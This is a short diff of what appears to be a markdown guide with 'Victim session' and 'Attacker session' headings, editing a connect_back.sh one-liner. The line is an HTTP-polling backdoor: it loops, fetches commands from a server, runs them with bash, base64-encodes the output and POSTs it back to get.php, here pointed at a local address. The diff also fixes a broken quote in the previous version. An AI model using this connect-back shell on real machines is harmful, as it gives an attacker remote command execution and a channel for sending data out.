@@ -3,7 +3,7 @@
 ## Victim session
 
 ### connect_back.sh
-while true ; do sleep 1 ; cmd=$(curl -s 'http://127.0.0.1:3000/'|grep .) && ret="GIF81$(echo "$cmd"|bash|base64 -w0) && curl -s -X POST -d "d=$ret" "http://127.0.0.1:3000/get.php" ; done
+while true ; do sleep 1 ; cmd=$(curl -s 'http://127.0.0.1:3000/'|grep .) && ret=$(echo "$cmd"|bash|base64 -w0) && curl -s -X POST -d "d=$ret" "http://127.0.0.1:3000/get.php" ; done
 
 ## Attacker session
 
